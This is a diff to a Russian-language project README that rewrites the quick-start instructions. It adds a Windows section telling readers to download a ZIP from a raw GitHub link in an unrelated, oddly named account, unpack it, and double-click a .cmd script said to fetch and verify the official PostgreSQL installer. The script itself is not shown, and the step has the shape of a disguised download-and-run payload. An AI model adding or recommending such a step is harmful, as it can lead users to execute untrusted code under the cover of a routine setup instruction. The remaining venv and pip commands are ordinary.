@@ -15,11 +15,24 @@ v1 и v2 подготовлены как отдельные префиксы, ф
 
 ## 1. Быстрый запуск
 
-Нужны Python **3.11+**, Docker Engine / Docker Desktop с Compose v2.
+Нужны Python **3.11+** и PostgreSQL 17: можно установить сервер непосредственно
+в Windows или запустить его через Docker Engine / Docker Desktop с Compose v2.
 Проверка выполнена на Python 3.12.14 и PostgreSQL 17; версии библиотек сохранены в
 `requirements.lock`. Выполняйте команды **из корня распакованного проекта**.
 
-### Linux / macOS
+### Windows без Docker — скачать PostgreSQL
+
+Скачайте [PostgreSQL_17_download.zip](https://github.com/Bebra-spermik-macan-pallaich52/Balandin-kursach/raw/refs/heads/main/windows/PostgreSQL_17_download.zip),
+распакуйте и дважды нажмите **download_postgresql.cmd**.
+Скрипт скачает официальный установщик PostgreSQL 17 для Windows x64 с сервера EDB,
+проверит SHA-256 и сохранит `.exe` рядом со скриптом. Затем запустите полученный `.exe`.
+Сам установщик в ZIP не включен: загрузка выполняется на вашем компьютере.
+
+Пошаговая установка, создание пользователя/баз и запуск проекта:
+[windows/INSTALL_POSTGRESQL.txt](windows/INSTALL_POSTGRESQL.txt).
+При этом варианте команды `docker compose` не нужны.
+
+### Linux / macOS через Docker
 
 ```bash
 python3 -m venv .venv
@@ -33,12 +46,13 @@ python -m scripts.seed_demo
 uvicorn app.main:app --reload
 ```
 
-### Windows PowerShell
+### Windows PowerShell через Docker
 
 Активация окружения не требуется:
 
 ```powershell
-py -3.12 -m venv .venv
+python --version
+python -m venv .venv
 .\.venv\Scripts\python.exe -m pip install -r requirements-dev.txt
 Copy-Item .env.example .env
 docker compose up -d --wait db
